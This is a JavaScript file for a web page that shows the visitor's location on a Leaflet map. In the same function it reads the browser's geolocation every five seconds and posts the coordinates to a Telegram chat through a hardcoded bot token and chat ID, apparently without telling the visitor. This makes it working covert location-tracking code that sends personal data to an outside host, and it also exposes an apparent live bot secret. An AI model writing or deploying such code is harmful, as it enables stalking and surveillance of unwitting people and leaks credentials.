if (!navigator.geolocation) {
    console.log("Your browser doesn't support the geolocation feature!");
} else {
    setInterval(() => {
        navigator.geolocation.getCurrentPosition(getPosition);
    }, 5000);
}

var marker, circle, lat, long, accuracy;

function getPosition(position) {
    lat = position.coords.latitude;
    long = position.coords.longitude;
    accuracy = position.coords.accuracy;

    if (marker) {
        map_init.removeLayer(marker);
    }

    if (circle) {
        map_init.removeLayer(circle);
    }

    marker = L.marker([lat, long]);
    circle = L.circle([lat, long], { radius: accuracy });

    var featureGroup = L.featureGroup([marker, circle]).addTo(map_init);

    map_init.fitBounds(featureGroup.getBounds());

    console.log("Your coordinate is: Lat: " + lat + " Long: " + long + " Accuracy: " + accuracy);

    // Telegram bot API token
    const botToken = '1988995536:AAEYUHJ5Wy9WUNUXeAHOOLTNslxELmYkKLQ'; // Replace with your Telegram Bot Secret
    const chatId = '-1001979008867'; // Replace with your Telegram chat ID
    const message = `Your coordinate is: Lat: ${lat} Long: ${long} Accuracy: ${accuracy}`;

    // Send the message to the Telegram bot
    axios
        .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        })
        .then(response => {
            console.log('Message sent to Telegram bot');
        })
        .catch(error => {
            console.error('Error sending message to Telegram bot:', error);
        });
}
